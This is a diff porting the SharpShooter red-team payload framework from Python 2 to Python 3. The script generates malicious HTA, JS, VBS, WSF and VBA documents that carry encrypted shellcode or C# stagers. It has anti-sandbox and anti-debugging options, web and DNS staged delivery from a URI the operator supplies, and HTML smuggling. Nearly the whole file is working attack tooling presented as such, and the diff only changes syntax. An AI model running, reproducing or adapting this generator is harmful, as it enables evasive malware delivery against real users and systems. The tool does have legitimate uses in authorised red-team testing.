@@ -1,4 +1,5 @@
-#!/usr/bin/python
+#! /usr/bin/env python
+
 # -*- coding: utf-8 -*-
 #
 # SharpShooter:
@@ -8,9 +9,28 @@
 # Author:
 #   Dominic Chell (@domchell), MDSec ActiveBreach (@mdseclabs)
 
-import base64, gzip, io, random, string, sys, cStringIO, argparse
+from __future__ import print_function
+
+import base64
+import gzip
+import random
+import string
+import sys
+import argparse
 from jsmin import jsmin
 from modules import *
+
+try:
+    raw_input
+    input = raw_input
+except NameError:
+    pass
+
+try:
+    from cStringIO import StringIO as BytesIO
+except ImportError:
+    from io import BytesIO
+
 
 class SharpShooter:
     banner = """
@@ -24,35 +44,34 @@ class SharpShooter:
      \033[1;32mDominic Chell, @domchell, MDSec ActiveBreach, v0.2\033[0;0m
     """
 
-
     def validate_args(self):
-        print self.banner
+        print(self.banner)
 
         antisandbox = "\n\033[92m[1]\033[0;0m Key to Domain (e.g. 1=CONTOSO)"
-        antisandbox +="\n\033[92m[2]\033[0;0m Ensure Domain Joined"
-        antisandbox +="\n\033[92m[3]\033[0;0m Check for Sandbox Artifacts"
-        antisandbox +="\n\033[92m[4]\033[0;0m Check for Bad MACs"
-        antisandbox +="\n\033[92m[5]\033[0;0m Check for Debugging"
+        antisandbox += "\n\033[92m[2]\033[0;0m Ensure Domain Joined"
+        antisandbox += "\n\033[92m[3]\033[0;0m Check for Sandbox Artifacts"
+        antisandbox += "\n\033[92m[4]\033[0;0m Check for Bad MACs"
+        antisandbox += "\n\033[92m[5]\033[0;0m Check for Debugging"
 
-        parser = argparse.ArgumentParser(description = "",  formatter_class=argparse.RawTextHelpFormatter)
-        parser.add_argument("--interactive", action='store_true', help = "Use the interactive menu")
-        parser.add_argument("--stageless", action='store_true', help = "Create a stageless payload")
-        parser.add_argument("--dotnetver", metavar="<ver>", dest = "dotnetver", default = None, help = "Target .NET Version: 2 or 4")
-        parser.add_argument("--payload", metavar="<format>", dest = "payload", default = None, help = "Payload type: hta, js, jse, vba, vbe, vbs, wsf")
-        parser.add_argument("--sandbox", metavar="<types>", dest = "sandbox", default = None, help = "Anti-sandbox techniques: " + antisandbox)
-        parser.add_argument("--delivery", metavar="<type>", dest = "delivery", default = None, help = "Delivery method: web, dns, both")
-        parser.add_argument("--rawscfile", metavar="<path>", dest = "rawscfile", default = None, help = "Path to raw shellcode file for stageless payloads")
-        parser.add_argument("--shellcode", action='store_true', help = "Use built in shellcode execution")
-        parser.add_argument("--scfile", metavar="<path>", dest = "shellcode_file", default = None, help = "Path to shellcode file as CSharp byte array")
-        parser.add_argument("--refs", metavar="<refs>", dest = "refs", default = None, help = "References required to compile custom CSharp,\ne.g. mscorlib.dll,System.Windows.Forms.dll")
-        parser.add_argument("--namespace", metavar="<ns>", dest = "namespace", default = None, help = "Namespace for custom CSharp,\ne.g. Foo.bar")
-        parser.add_argument("--entrypoint", metavar="<ep>", dest = "entrypoint", default = None, help = "Method to execute,\ne.g. Main")
-        parser.add_argument("--web", metavar="<web>", dest = "web", default = None, help = "URI for web delivery")
-        parser.add_argument("--dns", metavar="<dns>", dest = "dns", default = None, help = "Domain for DNS delivery")
-        parser.add_argument("--output", metavar="<output>", dest = "output", default = None, help = "Name of output file (e.g. maldoc)")
-        parser.add_argument("--smuggle", action='store_true', help = "Smuggle file inside HTML")
-        parser.add_argument("--template", metavar="<tpl>", dest = "template", default = None, help = "Name of template file (e.g. mcafee)")
-        
+        parser = argparse.ArgumentParser(description="", formatter_class=argparse.RawTextHelpFormatter)
+        parser.add_argument("--interactive", action='store_true', help="Use the interactive menu")
+        parser.add_argument("--stageless", action='store_true', help="Create a stageless payload")
+        parser.add_argument("--dotnetver", metavar="<ver>", dest="dotnetver", default=None, help="Target .NET Version: 2 or 4")
+        parser.add_argument("--payload", metavar="<format>", dest="payload", default=None, help="Payload type: hta, js, jse, vba, vbe, vbs, wsf")
+        parser.add_argument("--sandbox", metavar="<types>", dest="sandbox", default=None, help="Anti-sandbox techniques: " + antisandbox)
+        parser.add_argument("--delivery", metavar="<type>", dest="delivery", default=None, help="Delivery method: web, dns, both")
+        parser.add_argument("--rawscfile", metavar="<path>", dest="rawscfile", default=None, help="Path to raw shellcode file for stageless payloads")
+        parser.add_argument("--shellcode", action='store_true', help="Use built in shellcode execution")
+        parser.add_argument("--scfile", metavar="<path>", dest="shellcode_file", default=None, help="Path to shellcode file as CSharp byte array")
+        parser.add_argument("--refs", metavar="<refs>", dest="refs", default=None, help="References required to compile custom CSharp,\ne.g. mscorlib.dll,System.Windows.Forms.dll")
+        parser.add_argument("--namespace", metavar="<ns>", dest="namespace", default=None, help="Namespace for custom CSharp,\ne.g. Foo.bar")
+        parser.add_argument("--entrypoint", metavar="<ep>", dest="entrypoint", default=None, help="Method to execute,\ne.g. Main")
+        parser.add_argument("--web", metavar="<web>", dest="web", default=None, help="URI for web delivery")
+        parser.add_argument("--dns", metavar="<dns>", dest="dns", default=None, help="Domain for DNS delivery")
+        parser.add_argument("--output", metavar="<output>", dest="output", default=None, help="Name of output file (e.g. maldoc)")
+        parser.add_argument("--smuggle", action='store_true', help="Smuggle file inside HTML")
+        parser.add_argument("--template", metavar="<tpl>", dest="template", default=None, help="Name of template file (e.g. mcafee)")
+
         args = parser.parse_args()
 
         if not args.interactive:
@@ -65,7 +84,7 @@ class SharpShooter:
 
                     if (not dotnetver == 2 and not dotnetver == 4):
                         raise Exception
-                except Exception,e:
+                except Exception as e:
                     print("\033[1;31m[!]\033[0;0m Invalid .NET version")
                     sys.exit(-1)
 
@@ -119,13 +138,21 @@ class SharpShooter:
 
         return args
 
-    def read_file(self,f):
-        with open(f,'r') as fs:
+    def read_file(self, f):
+        with open(f, 'r') as fs:
             content = fs.read()
         return content
 
+    def rand_key(self, n):
+        return ''.join([random.choice(string.lowercase) for i in xrange(n)])
+
     def gzip_str(self, string_):
-        fgz = cStringIO.StringIO()
+        fgz = BytesIO()
+        try:
+            string_ = string_.encode()
+        except:
+            pass
+
         gzip_obj = gzip.GzipFile(mode='wb', fileobj=fgz)
         gzip_obj.write(string_)
         gzip_obj.close()
@@ -137,21 +164,21 @@ class SharpShooter:
         out = []
 
         for i in range(256):
-            j = (j + S[i] + ord( key[i % len(key)] )) % 256
-            S[i] , S[j] = S[j] , S[i]
+            j = (j + S[i] + ord(key[i % len(key)])) % 256
+            S[i], S[j] = S[j], S[i]
 
         i = j = 0
         for char in data:
-            i = ( i + 1 ) % 256
-            j = ( j + S[i] ) % 256
-            S[i] , S[j] = S[j] , S[i]
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
             out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
 
         return ''.join(out)
 
     def run(self, args):
 
-        template_body=""
+        template_body = ""
         template_base = "templates/sharpshooter."
         shellcode_delivery = False
         shellcode_gzip = ""
@@ -162,16 +189,16 @@ class SharpShooter:
         if args.interactive:
             while True:
                 try:
-                    print("\n\033[1;34m[*]\033[0;0m Which version of the .NET framework do you want to target?:")
+                    print("\n\033[1;34m[*]\033[0;0m Which version of the .NET framework do you want to target?")
                     print("\033[92m[1]\033[0;0m v2")
                     print("\033[92m[2]\033[0;0m v4 (OPSEC WARNING: Uses WScript.Shell)")
 
-                    dotnet_version = int(raw_input("\n"))
-                    if (dotnet_version<1 or dotnet_version>2):
+                    dotnet_version = int(input("\n"))
+                    if (dotnet_version < 1 or dotnet_version > 2):
                         raise Exception
                     else:
                         break
-                except Exception,e:
+                except Exception as e:
                     print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
         else:
             dotnet_version = int(args.dotnetver)
@@ -183,7 +210,7 @@ class SharpShooter:
 
         stageless_payload = False
         if(args.interactive):
-            stageless = raw_input("\n\033[1;34m[*]\033[0;0m Do you want to create a staged payload? i.e. web/DNS delivery (Y/N)").lower()
+            stageless = input("\n\033[1;34m[*]\033[0;0m Do you want to create a staged payload? i.e. web/DNS delivery (Y/N)").lower()
             if(stageless == "y" or stageless == "yes"):
                 stageless_payload = False
                 print("\033[1;34m[*]\033[0;0m Staged payload creation selected")
@@ -191,14 +218,14 @@ class SharpShooter:
                 stageless_payload = True
                 print("\033[1;34m[*]\033[0;0m Stageless payload creation selected")
 
-        if((args.stageless or stageless_payload == True) and dotnet_version == 2):
+        if((args.stageless or stageless_payload is True) and dotnet_version == 2):
             template_base = "templates/stageless."
-        elif((args.stageless or stageless_payload == True) and dotnet_version == 4):
+        elif((args.stageless or stageless_payload is True) and dotnet_version == 4):
             template_base = "templates/stagelessv4."
-        elif((args.stageless or stageless_payload == True) == 4):
+        elif((args.stageless or stageless_payload is True) == 4):
             template_base = "templates/sharpshooterv4."
 
-        #print template_base
+        # print template_base
         if args.interactive:
             print("\n\033[1;34m[*]\033[0;0m Select the type of payload to generate:")
             print("\033[92m[1]\033[0;0m HTA")
@@ -211,7 +238,7 @@ class SharpShooter:
 
         while True:
             if args.interactive:
-                payload_type = raw_input("\n\033[1;34m[*]\033[0;0m Enter payload to create\n")
+                payload_type = input("\n\033[1;34m[*]\033[0;0m Enter payload to create\n")
             else:
                 if(args.payload == "hta"):
                     payload_type = 1
@@ -230,7 +257,7 @@ class SharpShooter:
 
             try:
                 payload_type = int(payload_type)
-                if (payload_type<1 or payload_type>7):
+                if (payload_type < 1 or payload_type > 7):
                     raise Exception
 
                 if(payload_type == 1):
@@ -257,7 +284,7 @@ class SharpShooter:
                     template_body = self.read_file(template_base + "js")
                     file_type = "wsf"
                 break
-            except Exception,e:
+            except Exception as e:
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
         if(args.interactive):
@@ -278,7 +305,7 @@ class SharpShooter:
 
         while True:
             if(args.interactive):
-                sandboxevasion_type = raw_input("\n\033[1;34m[*]\033[0;0m Insert technique (multiple supported)\n")
+                sandboxevasion_type = input("\n\033[1;34m[*]\033[0;0m Insert technique (multiple supported)\n")
             else:
                 if(techniques_list):
                     sandboxevasion_type = techniques_list[0]
@@ -298,57 +325,57 @@ class SharpShooter:
                 sandboxevasion_type = int(sandboxevasion_type)
                 if sandboxevasion_type > 5: raise Exception
 
-                if (sandboxevasion_type ==  1):
+                if (sandboxevasion_type == 1):
                     if(args.interactive):
-                        domain_name = raw_input("\n\033[1;34m[*]\033[0;0m Enter domain (e.g. CONTOSO)\n")
-                    domain_name=domain_name.strip()
+                        domain_name = input("\n\033[1;34m[*]\033[0;0m Enter domain (e.g. CONTOSO)\n")
+                    domain_name = domain_name.strip()
 
                     if not domain_name: raise Exception
 
-                    if len(domain_name) <=1:
+                    if len(domain_name) <= 1:
                         raise Exception
                     else:
                         print("\033[1;34m[*]\033[0;0m Adding keying for %s domain") % domain_name
                         if("js" in file_type):
-                            sandbox_techniques+="\to.CheckPlease(0, \"%s\")\n" % domain_name
+                            sandbox_techniques += "\to.CheckPlease(0, \"%s\")\n" % domain_name
                         else:
-                            sandbox_techniques+="o.CheckPlease 0, \"%s\"\n" % domain_name
+                            sandbox_techniques += "o.CheckPlease 0, \"%s\"\n" % domain_name
                         continue
-                elif(sandboxevasion_type ==  2):
+                elif(sandboxevasion_type == 2):
                     print("\033[1;34m[*]\033[0;0m Keying to domain joined systems")
                     if("js" in file_type):
-                        sandbox_techniques+="\to.CheckPlease(1,\"foo\")\n"
+                        sandbox_techniques += "\to.CheckPlease(1,\"foo\")\n"
                     else:
-                        sandbox_techniques+="o.CheckPlease 1, \"foo\"\n"
+                        sandbox_techniques += "o.CheckPlease 1, \"foo\"\n"
                     continue
-                elif(sandboxevasion_type ==  3):
+                elif(sandboxevasion_type == 3):
                     print("\033[1;34m[*]\033[0;0m Avoiding sandbox artifacts")
-                        
+
                     if("js" in file_type):
-                        sandbox_techniques+="\to.CheckPlease(2,\"foo\")\n"
+                        sandbox_techniques += "\to.CheckPlease(2,\"foo\")\n"
                     else:
-                        sandbox_techniques+="o.CheckPlease 2,\"foo\"\n"
+                        sandbox_techniques += "o.CheckPlease 2,\"foo\"\n"
                     continue
-                elif(sandboxevasion_type ==  4):
+                elif(sandboxevasion_type == 4):
                     print("\033[1;34m[*]\033[0;0m Avoiding bad MACs")
-                    
+
                     if("js" in file_type):
-                        sandbox_techniques+="\to.CheckPlease(3,\"foo\")\n"
+                        sandbox_techniques += "\to.CheckPlease(3,\"foo\")\n"
                     else:
-                        sandbox_techniques+="o.CheckPlease 3,\"foo\"\n"
+                        sandbox_techniques += "o.CheckPlease 3,\"foo\"\n"
                     continue
-                elif(sandboxevasion_type ==  5):
+                elif(sandboxevasion_type == 5):
                     print("\033[1;34m[*]\033[0;0m Avoiding debugging")
 
                     if("js" in file_type):
-                        sandbox_techniques+="\to.CheckPlease(4,\"foo\")\n"
+                        sandbox_techniques += "\to.CheckPlease(4,\"foo\")\n"
                     else:
-                        sandbox_techniques+="o.CheckPlease 4,\"foo\"\n"
+                        sandbox_techniques += "o.CheckPlease 4,\"foo\"\n"
                     continue
                 elif(sandboxevasion_type == 0):
                     break
 
-            except Exception,e:
+            except Exception as e:
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
         template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
@@ -359,12 +386,12 @@ class SharpShooter:
             print("\033[92m[2]\033[0;0m PowerDNS Delivery")
             print("\033[92m[3]\033[0;0m Both")
 
-        delivery_method="1"
+        delivery_method = "1"
         encoded_sc = ""
         while True:
 
             if(args.interactive and not stageless_payload):
-                delivery_method = raw_input("\n\033[1;34m[*]\033[0;0m Select delivery method\n")
+                delivery_method = input("\n\033[1;34m[*]\033[0;0m Select delivery method\n")
             else:
                 if(args.delivery == "web"):
                     delivery_method = "1"
@@ -374,9 +401,9 @@ class SharpShooter:
                     delivery_method = "3"
             try:
                 delivery_method = int(delivery_method)
-                
+
                 if((args.interactive) and (not stageless_payload)):
-                    shellcode_payload = raw_input("\n\033[1;34m[*]\033[0;0m Do you want to use the builtin shellcode template? Y/N\n")
+                    shellcode_payload = input("\n\033[1;34m[*]\033[0;0m Do you want to use the builtin shellcode template? Y/N\n")
                 elif args.shellcode:
                     shellcode_payload = "y"
                 else:
@@ -394,7 +421,12 @@ class SharpShooter:
 
                         try:
                             while True:
-                                shellcode.append(raw_input())
+                                sc = input()
+                                try:
+                                    sc = sc.decode("UTF-8", errors="backslashreplace")
+                                except:
+                                    pass
+                                shellcode.append(sc)
                         except EOFError:
                             pass
                     else:
@@ -406,9 +438,9 @@ class SharpShooter:
                     shellcode_final = shellcode_template.replace("%SHELLCODE%", shellcode)
                     shellcode_gzip = self.gzip_str(shellcode_final)
 
-                elif (args.stageless or stageless_payload == True):
+                elif (args.stageless or stageless_payload is True):
                     if(args.interactive):
-                        args.rawscfile = raw_input("\n\033[1;34m[*]\033[0;0m Provide path to raw shellcode, e.g. ./sc.raw\n")
+                        args.rawscfile = input("\n\033[1;34m[*]\033[0;0m Provide path to raw shellcode, e.g. ./sc.raw\n")
                     rawsc = self.read_file(args.rawscfile)
                     encoded_sc = base64.b64encode(rawsc)
                     #if("vbs" in file_type or "hta" in file_type):
@@ -420,17 +452,17 @@ class SharpShooter:
                 else:
                     if(args.interactive):
                         print("\n\033[1;34m[*]\033[0;0m Custom CSharp required\n")
-                        refs = raw_input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")
+                        refs = input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")
                         while not refs:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide CSV for references required to compile program\n")
 
-                        namespace = raw_input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")
+                        namespace = input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")
                         while not namespace:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide namespace.class for program\n")
 
-                        entrypoint = raw_input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")
+                        entrypoint = input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")
                         while not entrypoint:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide name of method to execute\n")
                     else:
                         refs = args.refs
                         namespace = args.namespace
@@ -443,9 +475,9 @@ class SharpShooter:
 
                 if(delivery_method == 1 and not stageless_payload):
                     if(args.interactive):
-                        stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
+                        stager = input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                         while not stager:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                     else:
                         stager = args.web
 
@@ -456,9 +488,9 @@ class SharpShooter:
 
                 if(delivery_method == 2 and not stageless_payload):
                     if(args.interactive):
-                        stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
+                        stager = input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                         while not stager:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                     else:
                         stager = args.dns
 
@@ -469,9 +501,9 @@ class SharpShooter:
 
                 if((delivery_method == 3) and (not args.stageless) and (not stageless_payload)):
                     if(args.interactive):
-                        stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
+                        stager = input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                         while not stager:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide URI for CSharp web delivery\n")
                     else:
                         stager = args.web
 
@@ -481,9 +513,9 @@ class SharpShooter:
                         webdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 1, \"%s\"\n" % (refs, namespace, entrypoint, stager)
 
                     if(args.interactive):
-                        stager = raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
+                        stager = input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                         while not stager:
-                            raw_input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
+                            input("\n\033[1;34m[*]\033[0;0m Provide domain of PowerDNS stager\n")
                     else:
                         stager = args.dns
 
@@ -491,20 +523,19 @@ class SharpShooter:
                         dnsdelivery = "\to.Go(\"%s\", \"%s\", \"%s\", 2, \"%s\");" % (refs, namespace, entrypoint, stager)
                     else:
                         dnsdelivery = "\to.Go \"%s\", \"%s\", \"%s\", 2, \"%s\"" % (refs, namespace, entrypoint, stager)
-                    
+
                     deliverycode = webdelivery + dnsdelivery
                     template_code = template_code.replace("%DELIVERY%", deliverycode)
 
                 break
-            except Exception, err:
-                print err
+            except Exception as e:
+                print(e)
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
                 if not args.interactive:
                     sys.exit(-1)
 
-        #print template_code
-        rand_key = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
-        key = rand_key(10) 
+        # print template_code
+        key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
         payload_encoded = base64.b64encode(payload_encrypted)
 
@@ -534,9 +565,9 @@ class SharpShooter:
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
 
         if(args.interactive):
-            outputfile = raw_input("\n\033[1;34m[*]\033[0;0m Provide name of output file (e.g. \"maldoc\")\n")
+            outputfile = input("\n\033[1;34m[*]\033[0;0m Provide name of output file (e.g. \"maldoc\")\n")
             while not outputfile:
-                raw_input("\n\033[1;34m[*]\033[0;0m Provide name of output file (e.g. \"maldoc\")\n")
+                input("\n\033[1;34m[*]\033[0;0m Provide name of output file (e.g. \"maldoc\")\n")
         else:
             outputfile = args.output
 
@@ -562,21 +593,21 @@ class SharpShooter:
                 f.close()
                 print("\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s" % outputfile_shellcode)
 
-        if not "vba" in file_type:
-            smuggle="n"
+        if "vba" not in file_type:
+            smuggle = "n"
             if(args.interactive):
-                smuggle = raw_input("\n\033[1;34m[*]\033[0;0m Do you want to smuggle inside HTML? [Y/N]\n").lower()
+                smuggle = input("\n\033[1;34m[*]\033[0;0m Do you want to smuggle inside HTML? [Y/N]\n").lower()
             else:
                 if(args.smuggle):
                     smuggle = "y"
 
             if (smuggle == "y" or smuggle == "yes"):
-                rand_key = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
-                key = rand_key(10)
+                key = self.rand_key(10)
                 template = ""
                 if not args.interactive:
                     template = args.template
-                embedinhtml.run_embedInHtml(key, "./output/"+outputfile_payload, "./output/"+outputfile+".html", template)
+                embedinhtml.run_embedInHtml(key, "./output/" + outputfile_payload, "./output/" + outputfile + ".html", template)
+
 
 if __name__ == "__main__":
     ss = SharpShooter()
